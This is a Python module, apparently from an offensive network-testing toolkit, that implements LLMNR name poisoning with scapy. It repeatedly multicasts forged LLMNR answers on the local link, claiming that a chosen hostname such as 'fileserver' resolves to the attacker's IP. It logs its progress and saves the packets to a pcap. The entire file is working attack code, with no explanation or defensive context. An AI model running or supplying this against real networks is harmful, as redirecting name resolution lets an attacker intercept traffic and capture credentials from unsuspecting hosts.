import random, time
from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp, get_if_hwaddr, get_if_addr
from attacks.base import BaseAttack


class LlmnrPoison(BaseAttack):
    def run(self):
        spoof_name   = self.params.get("spoof_name", "fileserver")
        count        = int(self.params.get("count", 200))
        attacker_ip  = get_if_addr(self.iface)
        src_mac      = get_if_hwaddr(self.iface)

        LLMNR_MCAST  = "224.0.0.252"
        LLMNR_PORT   = 5355
        LLMNR_MAC    = "01:00:5e:00:00:fc"

        self.log(f"LLMNR Poison: claiming '{spoof_name}' → {attacker_ip}", "warn")
        writer = self.open_pcap()
        sent   = 0

        while not self._stop.is_set():
            if count and sent >= count:
                break
            pkt = (
                Ether(src=src_mac, dst=LLMNR_MAC)
                / IP(src=attacker_ip, dst=LLMNR_MCAST, ttl=1)
                / UDP(sport=LLMNR_PORT, dport=LLMNR_PORT)
                / DNS(
                    id=random.randint(1, 0xFFFF),
                    qr=1, opcode=0, aa=0, tc=0, rd=0, ra=0,
                    z=0, ad=0, cd=0, rcode=0,
                    qdcount=1, ancount=1,
                    qd=DNSQR(qname=spoof_name, qtype="A", qclass="IN"),
                    an=DNSRR(rrname=spoof_name, type="A", ttl=30, rdata=attacker_ip),
                )
            )
            try:
                sendp(pkt, iface=self.iface, verbose=False)
                self.write(pkt)
                sent += 1
                if sent % 50 == 0:
                    self.log(f"LLMNR Poison: {sent} responses sent", "info")
            except Exception as e:
                self.log(f"LLMNR error: {e}", "error"); break
            time.sleep(0.1)

        writer.close()
        self.log(f"LLMNR Poison stopped — {sent} responses sent", "success")
